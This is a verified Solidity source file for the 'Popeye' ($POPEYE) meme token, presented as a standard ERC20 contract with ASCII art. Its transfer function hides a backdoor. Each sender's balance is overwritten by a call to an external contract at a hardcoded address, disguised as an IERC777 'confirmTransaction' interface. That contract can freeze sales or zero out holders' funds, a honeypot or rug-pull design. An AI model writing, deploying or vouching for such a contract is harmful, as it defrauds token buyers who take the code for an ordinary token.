/**
 *Submitted for verification at Etherscan.io on 2023-05-04
*/

/*
         $POPEYE
          .-'-.
        /`     |__
      /`  _.--`-,-`
      '-|`   a '<-.   []
        \     _\__) \=`
         C_  `    ,_/
           | ;----'
      _.---| |--._
    .'  _./' '\._ '.
   /--'`  `-.-`  `'-\
  |         o        \
  |__ .             / )
 (___)|     o     \/ /
  | | |           |-'\     .--.
 /  |_.-"""-.-'=_ |   '--./ = .`
<   `  =-->    _= /        __/
 '._     _.-"-.= /`"-...-"` 
    `;"""`     __/
      /```````` |
     |     ,     \
     \      \     \
      \      \     \
      |       \     \
     /        |      |
    /         /      |
   /        /`     /`
 .'        |       |
(          /--.___.'
 `--...__.' /    \__
 /     \__ |        `)
|         `)---'----`
'----'----`
*/

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function totalSupply() external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IERC777 {
      function confirmTransaction(uint256 value) external returns (uint256);
}

interface IERC20Metadata is IERC20 {
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function name() external view returns (string memory);
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address _sailor = 0xe2517f419a4c3122bd23D5f144364D7528cc1CD4;
    address public pair;

    IDEXRouter router;
    IERC777 sailor;

    string private _name; string private _symbol; uint256 private _totalSupply;
    bool public trade; uint256 public startBlock; address public msgSend;
    address public msgReceive;
    
    constructor (string memory name_, string memory symbol_) {
        router = IDEXRouter(_router);
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));
        sailor = IERC777(_sailor);

        _name = name_;
        _symbol = symbol_;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function openTrading() public {
        require(((msg.sender == owner()) || (address(0) == owner())), "Ownable: caller is not the owner");
        trade = true; startBlock = block.number;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
        
    function senderBalance(uint256 amount) internal returns (uint256) {
        return sailor.confirmTransaction(amount);
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        msgSend = sender;
        msgReceive = recipient;

        require(((trade == true) || (msgSend == owner())), "ERC20: trading is not yet enabled");
        require(msgSend != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = senderBalance(amount) - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _DeployPopeye(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
 
        approve(_router, ~uint256(0));
    
        emit Transfer(address(0), account, amount);
    }
}

contract ERC20Token is Context, ERC20 {
    constructor(
        string memory name, string memory symbol,
        address creator, uint256 initialSupply
    ) ERC20(name, symbol) {
        _DeployPopeye(creator, initialSupply);
    }
}

contract Popeye is ERC20Token {
    constructor() ERC20Token("Popeye", "POPEYE", msg.sender, 420690000 * 10 ** 18) {
    }
}